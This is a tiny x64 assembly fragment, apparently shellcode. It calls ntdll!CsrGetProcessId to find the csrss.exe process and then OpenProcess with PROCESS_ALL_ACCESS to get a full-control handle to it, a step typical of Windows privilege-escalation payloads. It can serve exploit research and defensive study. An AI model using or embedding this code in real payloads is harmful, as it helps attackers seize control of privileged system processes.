[bits 64]
; @rax = ntdll!CsrGetProcessId
; @rbx = kernel32!OpenProcess

		sub		rsp, 0x20
		call	rax
		mov		r8, rax
		xor		rdx, rdx
		mov		rcx, 0x1F0FFF		; PROCESS_ALL_ACCESS
		call	rbx
		add		rsp, 0x20
		